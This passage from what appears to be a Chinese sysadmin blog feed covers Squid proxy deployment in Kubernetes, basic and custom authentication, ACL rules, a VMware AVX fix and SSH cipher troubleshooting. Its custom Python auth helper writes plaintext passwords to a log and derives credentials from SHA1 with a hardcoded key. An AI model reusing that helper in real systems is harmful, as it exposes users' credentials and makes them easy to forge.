<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create -f squid-volume.yaml</span><br><span class="line">kubectl replace -f squid-deployment.yaml</span><br></pre></td></tr></table></figure>
<p>确认Pod运行正常, PV和PVC创建成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n squid get pod</span><br><span class="line">NAME                    READY   STATUS    RESTARTS   AGE</span><br><span class="line">squid-864dbf5fd-khhb5   1/1     Running   0          2m19s</span><br><span class="line"></span><br><span class="line"># kubectl -n squid get pvc</span><br><span class="line">N AME          STATUS   VOLUME         CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br><span class="line">squid-claim   Bound    squid-volume   4Gi        RWO                           78s</span><br><span class="line"></span><br><span class="line"># [root@k8s-master deploy]# kubectl get pv</span><br><span class="line">NAME           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM               STORAGECLASS   REASON   AGE</span><br><span class="line">squid-volume   4Gi        RWO            Retain           Bound    squid/squid-claim                           80s</span><br></pre></td></tr></table></figure>

<p>测试, 先打几个HTTPS请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x localhost:3128 https://www.baidu.com</span><br><span class="line">200 OK </span><br></pre></td></tr></table></figure>

<p>再查看宿主机<code>/data/squidlog/</code>目录, Squid日志已经成功挂出; 且删除Pod后日志仍然保留在宿主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ll /data/squidlog/</span><br><span class="line">total 8</span><br><span class="line">-rw-r-----. 1 23 23  309 Dec  8 13:46 access.log</span><br><span class="line">-rw-r-----. 1 23 23 2039 Dec  8 13:46 cache.log</span><br><span class="line"></span><br><span class="line"># kubectl -n squid delete deploy squid</span><br><span class="line">deployment.apps &quot;squid&quot; deleted</span><br><span class="line"># ll /data/squidlog/</span><br><span class="line">total 8</span><br><span class="line">-rw-r-----. 1 23 23  309 Dec  8 13:46 access.log</span><br><span class="line">-rw-r-----. 1 23 23 2039 Dec  8 13:46 cache.log</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Kubernetes</tag>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>给Squid代理添加HTTP basic认证</title>
    <url>/2024/1208150716.html</url>
    <content><![CDATA[<p>HTTP basic认证是一种简单的认证机制，要求用户在请求资源前提供有效的用户名和密码。</p>
<h1><span id="实例-给squid代理添加http-basic认证">实例: 给Squid代理添加HTTP basic认证</span></h1><p>要求: 只允许用户名为peter,密码为123的请求通过认证, 其他请求返回407(Proxy认证失败)</p>
<h2><span id="步骤">步骤</span></h2><p>1 使用<code>htpasswd</code>工具，生成用户名密码。 例如这里添加用户名peter, 密码123.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install httpd-tools</span><br><span class="line">htpasswd -c /etc/squid/squid_user peter</span><br><span class="line">New password: 123</span><br><span class="line">Re-type new password: 123</span><br><span class="line">Adding password for user peter</span><br></pre></td></tr></table></figure>
<p>检查密码文件<code>/etc/squid/squid_user</code>，可以找到刚才添加的用户<code>peter</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/squid/squid_user</span><br><span class="line">peter:$XXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>对密码文件设置适当权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown squid /etc/squid/squid_user</span><br></pre></td></tr></table></figure>
<p>验证用户名和密码是否正确, 执行<code>basic_ncsa_auth</code>程序，输入<code>peter 123</code>，显示OK说明正确。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user </span><br><span class="line">peter 123</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>2 修改squid配置文件<code>/etc/squid/squid.conf</code>，添加认证相关的配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Insert your own rules here to allow access from your clients</span><br><span class="line"></span><br><span class="line"># http_access allow localhost 加注释，表示localhost也需要认证</span><br><span class="line"></span><br><span class="line">auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user</span><br><span class="line">auth_param basic children 5</span><br><span class="line">auth_param basic realm Proxy Authentication Required</span><br><span class="line">auth_param basic credentialsttl 2 hours</span><br><span class="line">auth_param basic casesensitive on</span><br><span class="line"></span><br><span class="line">acl authUsers proxy_auth REQUIRED</span><br><span class="line">http_access allow authUsers</span><br><span class="line"></span><br><span class="line">http_access deny all</span><br></pre></td></tr></table></figure>

<p>修改配置完成后，重启Squid (<code>systemctl restart squid</code>)</p>
<h2><span id="验证">验证</span></h2><p>使用<code>curl</code>测试Squid用户名密码认证配置<br>不使用用户名密码认证，访问失败，返回407</p>
<p><img data-src="/2024/1208150716/basic_auth1.png" alt="basic_auth1.png"></p>
<p>使用正确的用户名密码认证，访问成功</p>
<p><img data-src="/2024/1208150716/basic_auth2.png" alt="basic_auth2.png"></p>
<h1><span id="通过编写auth程序自定义灵活的认证策略">通过编写Auth程序，自定义灵活的认证策略</span></h1><p>最基础的basic认证方式，不一定能满足实际使用需求，考虑如下需求：<br>对于请求的USER, 用SHA1算法加密, 明文为（USER + 一个固定key), 如果请求的PASSWORD和加密后的字符串一致，就认为认证通过，否则不通过。 如何实现这种自定义认证？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Username: GUID</span><br><span class="line">- Password: Digest = SHA1 ( GUID + KEY )</span><br></pre></td></tr></table></figure>

<p>Squid支持自定义认证，只需要编写自定义认证程序，再修改Squid配置项auth_param即可，方法如下:</p>
<h2><span id="编写自定义认证程序">编写自定义认证程序</span></h2><p>写一个Python脚本, 主流程是一个死循环, 每次从标准输入读取请求中的user,passwd, 再通过SHA1算法判断密码是否正确。 如密码正确输出OK, 否则输出ERR</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(levelname)s %(message)s&#x27;</span>,</span><br><span class="line">                    filename=<span class="string">&#x27;/var/log/squid/auth.log&#x27;</span>, filemode=<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha1_encrypt</span>(<span class="params">username</span>):</span><br><span class="line">    combined = username + <span class="string">&quot;squid&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(combined.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate</span>(<span class="params">username, password</span>):</span><br><span class="line">    encrypted_password = sha1_encrypt(username)</span><br><span class="line">    <span class="keyword">return</span> encrypted_password == password</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = sys.stdin.readline()</span><br><span class="line">        auth = line.split()</span><br><span class="line">        user, passwd = auth[<span class="number">0</span>], auth[<span class="number">1</span>]</span><br><span class="line">        logging.debug(<span class="string">&quot;Auth user=&#123;&#125;, pwd=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, passwd))</span><br><span class="line">        <span class="keyword">if</span> authenticate(user, passwd):</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stdout.write(<span class="string">&#x27;ERR\n&#x27;</span>)</span><br><span class="line">        sys.stdout.flush()</span><br></pre></td></tr></table></figure>
<p>把Python脚本安装到&#x2F;my_auth, 再修改squid.conf, 添加如下内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http_access allow localhost # 允许localhost直接访问，无需认证</span><br><span class="line"></span><br><span class="line">auth_param basic program /my_auth # 自定义认证程序</span><br><span class="line">auth_param basic key_extras &quot;%&gt;rd&quot;</span><br><span class="line">auth_param basic children 5</span><br><span class="line">auth_param basic realm Please enter your device credential</span><br><span class="line">auth_param basic credentialsttl 24 hours # 24小时内不需要再认证</span><br><span class="line">auth_param basic casesensitive on # 大小写敏感</span><br><span class="line">acl AuthUsers proxy_auth REQUIRED</span><br><span class="line"></span><br><span class="line">http_access allow AuthUsers</span><br><span class="line"></span><br><span class="line">http_access deny all # 只允许localhost请求, 或者认证通过的请求</span><br></pre></td></tr></table></figure>
<p>注:</p>
<ul>
<li>允许localhost不带认证直接访问</li>
<li>别的机器访问必须通过认证，否则返回407</li>
</ul>
<p><strong>测试</strong><br>用户名和密码正确, 返回200</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x peter:47ae7e2352e92154c82669de2a99dd2091e60faa@192.168.52.202:3128 https://www.baidu.com</span><br><span class="line">...</span><br><span class="line">200 OK </span><br></pre></td></tr></table></figure>
<p>密码错误，返回407</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x peter123:123@192.168.52.202:3128 https://www.baidu.com</span><br><span class="line">curl: (56) Received HTTP code 407 from proxy after CONNECT</span><br></pre></td></tr></table></figure>
<p>调试认证程序, 可以查看日志<code>/var/log/squid/auth.log</code></p>
<h1><span id="参考">参考</span></h1><p><a href="https://wiki.squid-cache.org/Features/Authentication">https://wiki.squid-cache.org/Features/Authentication</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware虚拟机CPU不支持AVX指令集，但物理CPU支持</title>
    <url>/2024/1210195546.html</url>
    <content><![CDATA[<p>解决方法：<br>把虚拟机关机，编辑虚拟机的CPU设置，将CPU虚拟化设置改为硬件模式，再重启虚拟机后，问题解决。</p>
<p>参考：<a href="https://blog.csdn.net/hzgnet2021/article/details/134925349">https://blog.csdn.net/hzgnet2021/article/details/134925349</a></p>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>VMware</tag>
      </tags>
  </entry>
  <entry>
    <title>Squid ACL访问控制实践</title>
    <url>/2024/1210195948.html</url>
    <content><![CDATA[<h2><span id="acl简介">ACL简介</span></h2><p>Squid ACL（Access Control List，访问控制列表）提供了代理控制的功能。<br>通过设置ACL，Squid可以针对源地址、目标地址、访问的URL路径、访问的时间等各种条件进行过滤，从而实现对网络流量的精细控制。</p>
<p>基本的ACL元素语法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl name type value1 value2 ...</span><br></pre></td></tr></table></figure>
<p>可以对一个ACL元素列举多个值，也可以多个ACL行使用同一个名字。例如，以下两种配置方式是等价的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl safe_ports port 80 443 8080</span><br></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl safe_ports port 80</span><br><span class="line">acl safe_ports port 443</span><br><span class="line">acl safe_ports port 8080</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h2><span id="acl使用方法实例">ACL使用方法实例</span></h2><h3><span id="实例1只允许网段102062160x2f24的客户机访问squid-拒绝其他客户端请求">实例1：只允许网段10.206.216.0&#x2F;24的客户机访问Squid, 拒绝其他客户端请求</span></h3><p>修改squid.conf,添加如下几行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl clients src 10.206.216.0/24</span><br><span class="line">http_access allow clients</span><br><span class="line">http_access deny all</span><br></pre></td></tr></table></figure>
<p>使用如下命令校验配置文件，重启Squid</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">squid -k parse # 校验Squid配置文件</span><br><span class="line">squid -k reconfigure # 重新加载配置</span><br></pre></td></tr></table></figure>

<h3><span id="实例2只允许访问指定的域名或ip">实例2：只允许访问指定的域名或IP</span></h3><p>修改squid.conf,添加如下几行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl SSL_ports port 443</span><br><span class="line">http_access deny CONNECT !SSL_ports</span><br><span class="line"></span><br><span class="line">acl allow_domain dstdomain www.baidu.com .google.com</span><br><span class="line">acl allow_ip dst 180.101.50.188 142.250.199.100</span><br><span class="line">http_access allow allow_domain</span><br><span class="line">http_access allow allow_ip</span><br></pre></td></tr></table></figure>
<p>注: 当ACL域名以”.”开头，squid将它作为通配符，它匹配在该域的任何主机名，甚至域名自身。如果ACL域名不以”.”开头，squid使用精确的字符串比较。</p>
<p>测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x localhost:3128 https://www.baidu.com</span><br><span class="line">curl -x localhost:3128 https://www.google.com</span><br><span class="line">curl -x localhost:3128 180.101.50.188</span><br><span class="line">curl -x localhost:3128 142.250.199.100</span><br><span class="line">都应该返回200 OK</span><br><span class="line"></span><br><span class="line">访问其他domain或IP, 返回403 Forbidden</span><br><span class="line">curl -x localhost:3128 https://www.4399.com</span><br><span class="line">curl: (56) Received HTTP code 403 from proxy after CONNECT</span><br></pre></td></tr></table></figure>

<h3><span id="实例3允许非443端口的fqdn通过">实例3：允许非443端口的FQDN通过</span></h3><p>实际场景中，HTTPS server未必都是443标准端口。<br>比方说,我需要允许<code>www.yourserver.com:8080</code>这个FQDN通过，拒绝其他HTTPS请求。 squid.conf可以配置如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl SSL_ports port 8080</span><br><span class="line">http_access deny CONNECT !SSL_ports</span><br><span class="line"></span><br><span class="line">acl PORT_8080 port 8080</span><br><span class="line">acl allow_domain_8080 dstdomain www.yourserver.com</span><br><span class="line">http_access allow allow_domain_8080 PORT_8080</span><br></pre></td></tr></table></figure>
<p>测试:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x peter:123@localhost:3128 https://www.yourserver.com:8080</span><br><span class="line">返回200 OK，或者超时， 不会返回403 Forbidden</span><br></pre></td></tr></table></figure>

<h3><span id="实例4只允许通过认证的客户访问squid">实例4：只允许通过认证的客户访问Squid</span></h3><p>参考: <a href="https://blog.csdn.net/pcj_888/article/details/144328927">给Squid代理添加basic认证</a></p>
<h3><span id="一个综合案例">一个综合案例</span></h3><p>配置squid.conf，需求如下：</p>
<ul>
<li>只允许通过HTTP basic认证的客户访问Squid</li>
<li>对于通过认证的客户, 只允许如下FQDN通过，拒绝其他的FQDN<ul>
<li><a href="http://www.baidu.com:443/">www.baidu.com:443</a>, *.google.com:443, 180.101.50.188:443 142.250.199.100:443, <a href="http://www.yourserver.com:8080/">www.yourserver.com:8080</a></li>
</ul>
</li>
</ul>
<p>Squid.conf配置如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/squid_user</span><br><span class="line">auth_param basic children 5</span><br><span class="line">auth_param basic realm Proxy Authentication Required</span><br><span class="line">auth_param basic credentialsttl 2 hours</span><br><span class="line">auth_param basic casesensitive on</span><br><span class="line"></span><br><span class="line">acl authUsers proxy_auth REQUIRED</span><br><span class="line"></span><br><span class="line">acl SSL_ports port 443</span><br><span class="line">acl SSL_ports port 8080</span><br><span class="line">http_access deny CONNECT !SSL_ports</span><br><span class="line"></span><br><span class="line">acl PORT_443 port 443</span><br><span class="line">acl PORT_8080 port 8080</span><br><span class="line"></span><br><span class="line">acl allow_domain dstdomain www.baidu.com .google.com</span><br><span class="line">acl allow_ip dst 180.101.50.188 142.250.199.100</span><br><span class="line">http_access allow allow_domain PORT_443 authUsers</span><br><span class="line">http_access allow allow_ip PORT_443 authUsers # 同时满足allow_ip, PORT_443, authUsers这三个ACL的请求才允许通过;</span><br><span class="line"></span><br><span class="line">acl allow_domain_8080 dstdomain www.yourserver.com</span><br><span class="line">http_access allow allow_domain_8080 PORT_8080 authUsers</span><br><span class="line"></span><br><span class="line">http_access deny all</span><br></pre></td></tr></table></figure>

<p>测试:<br>不带认证访问白名单的FQDN, 返回407</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x localhost:3128 https://www.baidu.com</span><br><span class="line">curl: (56) Received HTTP code 407 from proxy after CONNECT</span><br></pre></td></tr></table></figure>
<p>认证正确，但访问不在白名单的FQDN，返回403</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x peter:123@localhost:3128 https://www.4399.com</span><br><span class="line">curl: (56) Received HTTP code 403 from proxy after CONNECT</span><br><span class="line">curl -x peter:123@localhost:3128 https://www.yourserver.com</span><br><span class="line">curl: (56) Received HTTP code 403 from proxy after CONNECT</span><br></pre></td></tr></table></figure>
<p>认证正确，访问白名单的FQDN，返回200 OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x peter:123@localhost:3128 https://www.baidu.com</span><br><span class="line">curl -x peter:123@localhost:3128 https://www.yourserver.com:8080</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】 <a href="http://blog.zyan.cc/book/squid/chap06.html">Squid中文权威指南 第6章</a><br>【2】 <a href="https://developer.aliyun.com/article/415847">巧用Squid的ACL和访问列表实现高效访问控制</a></p>
]]></content>
      <categories>
        <category>Squid</category>
      </categories>
      <tags>
        <tag>Squid</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH连接报错, Corrupted MAC on input解决方法</title>
    <url>/2024/1210195732.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>客户在windows CMD中SSH连接失败，报错:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Corrupted MAC on input</span><br><span class="line">ssh_dispatch_run_fatal: Connection to x.x.x.x port 22: message authentication code incorrect</span><br></pre></td></tr></table></figure>
<p>值得注意的是，客户通过别的机器做SSH连接可以成功，使用putty, mobaxterm连接也可以成功</p>
<h2><span id="原因分析">原因分析</span></h2><p>通过别的机器能做SSH连接，说明SSH服务端本身没有问题，网络连接也正常。<br>这个原因一般是SSH客户端和服务器的配置不匹配，使用了不同的MAC(消息认证码)或cipher(加密算法)，导致协商失败。</p>
<h2><span id="定位思路">定位思路</span></h2><p>分别查看SSH客户端和服务端支持的MAC和cipher列表，先确认配置是否匹配。</p>
<span id="more"></span>

<p>查看SSH客户端支持的MAC和cipher的方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -Q mac</span><br><span class="line">hmac-sha1</span><br><span class="line">hmac-sha1-96</span><br><span class="line">hmac-sha2-256</span><br><span class="line">hmac-sha2-512</span><br><span class="line">hmac-md5</span><br><span class="line">hmac-md5-96</span><br><span class="line">umac-64@openssh.com</span><br><span class="line">umac-128@openssh.com</span><br><span class="line">hmac-sha1-etm@openssh.com</span><br><span class="line">hmac-sha1-96-etm@openssh.com</span><br><span class="line">hmac-sha2-256-etm@openssh.com</span><br><span class="line">hmac-sha2-512-etm@openssh.com</span><br><span class="line">hmac-md5-etm@openssh.com</span><br><span class="line">hmac-md5-96-etm@openssh.com</span><br><span class="line">umac-64-etm@openssh.com</span><br><span class="line">umac-128-etm@openssh.com</span><br><span class="line"></span><br><span class="line">ssh -Q cipher</span><br><span class="line">3des-cbc</span><br><span class="line">aes128-cbc</span><br><span class="line">aes192-cbc</span><br><span class="line">aes256-cbc</span><br><span class="line">aes128-ctr</span><br><span class="line">aes192-ctr</span><br><span class="line">aes256-ctr</span><br><span class="line">aes128-gcm@openssh.com</span><br><span class="line">aes256-gcm@openssh.com</span><br><span class="line">chacha20-poly1305@openssh.com</span><br></pre></td></tr></table></figure>

<p>再查看SSH服务端支持的MAC和cipher，有两种方法（无需登录服务端后台)</p>
<p>方法1: 客户端使用nmap测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nmap --script ssh2-enum-algos -sV -p 22 10.206.216.97</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.40 ( http://nmap.org ) at 2024-12-09 22:00 EST</span><br><span class="line">Nmap scan report for 10.206.216.97</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.7 (protocol 2.0)</span><br><span class="line">| ssh2-enum-algos:</span><br><span class="line">|   kex_algorithms (10)</span><br><span class="line">|       curve25519-sha256</span><br><span class="line">|       curve25519-sha256@libssh.org</span><br><span class="line">|       ecdh-sha2-nistp256</span><br><span class="line">|       ecdh-sha2-nistp384</span><br><span class="line">|       ecdh-sha2-nistp521</span><br><span class="line">|       diffie-hellman-group-exchange-sha256</span><br><span class="line">|       diffie-hellman-group14-sha256</span><br><span class="line">|       diffie-hellman-group16-sha512</span><br><span class="line">|       diffie-hellman-group18-sha512</span><br><span class="line">|       kex-strict-s-v00@openssh.com</span><br><span class="line">|   server_host_key_algorithms (4)</span><br><span class="line">|       rsa-sha2-512</span><br><span class="line">|       rsa-sha2-256</span><br><span class="line">|       ecdsa-sha2-nistp256</span><br><span class="line">|       ssh-ed25519</span><br><span class="line">|   encryption_algorithms (4)</span><br><span class="line">|       aes256-gcm@openssh.com</span><br><span class="line">|       aes256-ctr</span><br><span class="line">|       aes128-gcm@openssh.com</span><br><span class="line">|       aes128-ctr</span><br><span class="line">|   mac_algorithms (6)</span><br><span class="line">|       hmac-sha2-256-etm@openssh.com</span><br><span class="line">|       umac-128-etm@openssh.com</span><br><span class="line">|       hmac-sha2-512-etm@openssh.com</span><br><span class="line">|       hmac-sha2-256</span><br><span class="line">|       umac-128@openssh.com</span><br><span class="line">|       hmac-sha2-512</span><br><span class="line">|   compression_algorithms (2)</span><br><span class="line">|       none</span><br><span class="line">|_      zlib@openssh.com</span><br><span class="line">MAC Address: 00:0C:29:8F:61:C4 (VMware)</span><br></pre></td></tr></table></figure>
<p>重点关注MAC和cipher, 是否和客户端支持的匹配：</p>
<ul>
<li>encryption_algorithms（加密算法）： 加密算法用于加密通信双方之间的数据，确保数据的机密性。这些算法可以是对称的（使用相同的密钥加密和解密）或非对称的（使用公钥加密，私钥解密）。SSH中常用的对称加密算法包括aes128-ctr、aes256-ctr等。</li>
<li>mac_algorithms（消息认证码算法）： 消息认证码（MAC）算法用于确保数据的完整性和真实性，即确保数据在传输过程中没有被篡改，并且确实来自声称的发送者。这些算法通常与加密算法一起使用，为加密的数据提供额外的保护层。常见的MAC算法包括hmac-sha2-256、hmac-sha1等。</li>
</ul>
<p>其他算法说明：</p>
<ul>
<li>kex_algorithms（密钥交换算法）： 密钥交换算法用于在客户端和服务器之间安全地交换加密密钥。这是建立安全会话的第一步，确保后续通信的机密性和完整性。常见的密钥交换算法包括diffie-hellman-group14-sha256、diffie-hellman-group-exchange-sha256等。</li>
<li>server_host_key_algorithms（服务器主机密钥算法）： 服务器主机密钥算法用于服务器身份验证。服务器使用这些算法生成公钥和私钥对，公钥公开给客户端，私钥用于签名消息以证明服务器的身份。常见的服务器主机密钥算法包括ssh-rsa、ecdsa-sha2-nistp256等。</li>
<li>compression_algorithms（压缩算法）： 压缩算法用于减少传输数据的大小，从而加快数据传输速度并减少带宽使用。虽然压缩可以提高性能，但它也可能增加CPU的使用率。SSH中常用的压缩算法包括none（不压缩）、zlib等。</li>
</ul>
<p>方法2: 客户端使用<code>ssh -vv</code>, 再根据输出查看MAC和cipher的协商过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -vv root@10.206.216.97</span><br><span class="line"></span><br><span class="line">OpenSSH_for_Windows_9.5p1, LibreSSL 3.8.2</span><br><span class="line">debug2: resolve_canonicalize: hostname 10.206.216.97 is address</span><br><span class="line">debug1: Connecting to 10.206.216.97 [10.206.216.97] port 22.</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">debug2: KEX algorithms: curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com</span><br><span class="line">debug2: host key algorithms: ssh-ed25519-cert-v01@openssh.com,ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,sk-ssh-ed25519-cert-v01@openssh.com,sk-ecdsa-sha2-nistp256-cert-v01@openssh.com,rsa-sha2-512-cert-v01@openssh.com,rsa-sha2-256-cert-v01@openssh.com,ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com,rsa-sha2-512,rsa-sha2-256</span><br><span class="line">debug2: ciphers ctos: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com</span><br><span class="line">debug2: ciphers stoc: chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com</span><br><span class="line">debug2: MACs ctos: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512</span><br><span class="line">debug2: MACs stoc: umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512</span><br><span class="line">debug2: compression ctos: none,zlib@openssh.com,zlib</span><br><span class="line">debug2: compression stoc: none,zlib@openssh.com,zlib</span><br><span class="line">debug2: languages ctos: </span><br><span class="line">debug2: languages stoc: </span><br><span class="line">debug2: first_kex_follows 0 </span><br><span class="line">debug2: reserved 0 </span><br><span class="line">debug2: peer server KEXINIT proposal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug2: KEX algorithms: curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,kex-strict-s-v00@openssh.com</span><br><span class="line">debug2: host key algorithms: rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519</span><br><span class="line">debug2: ciphers ctos: aes256-gcm@openssh.com,aes256-ctr,aes128-gcm@openssh.com,aes128-ctr</span><br><span class="line">debug2: ciphers stoc: aes256-gcm@openssh.com,aes256-ctr,aes128-gcm@openssh.com,aes128-ctr</span><br><span class="line">debug2: MACs ctos: hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,umac-128@openssh.com,hmac-sha2-512</span><br><span class="line">debug2: MACs stoc: hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,umac-128@openssh.com,hmac-sha2-512</span><br><span class="line">debug2: compression ctos: none,zlib@openssh.com</span><br><span class="line">debug2: compression stoc: none,zlib@openssh.com</span><br><span class="line">debug2: languages ctos: </span><br><span class="line">debug2: languages stoc: </span><br><span class="line">debug2: first_kex_follows 0 </span><br><span class="line">debug2: reserved 0 </span><br><span class="line"></span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ssh-ed25519</span><br><span class="line">debug1: kex: server-&gt;client cipher: aes128-ctr MAC: umac-128-etm@openssh.com compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: aes128-ctr MAC: umac-128-etm@openssh.com compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: SSH2_MSG_KEX_ECDH_REPLY received</span><br><span class="line">debug1: Server host key: ssh-ed25519 SHA256:kQPh28MT+40A8EpxJOcmt+lHMS5QlF1YN/lv05KM+Yg</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2><span id="解决方法">解决方法</span></h2><p>在客户端做ssh连接时, 手动指定服务端支持的MAC或cipher，例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -m hmac-sha2-512 -c aes128-ctr root@10.206.216.97 # -m指定MAC, -c指定cipher</span><br></pre></td></tr></table></figure>
<p>或者修改服务端配置，添加任一个客户端支持的MAC或cipher。在Rocky Linux 9上，可以修改配置文件<code>/etc/crypto-policies/back-ends/opensshserver.config</code></p>
<h2><span id="参考">参考</span></h2><p>【1】<a href="https://www.h3c.com/cn/d_200805/606213_30003_0.htm">SSH技术白皮书</a></p>
]]></content>
      <categories>
        <category>SSH</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>如何给Squid配置父代理，访问外部网络</title>
    <url>/2024/1211211031.html</url>
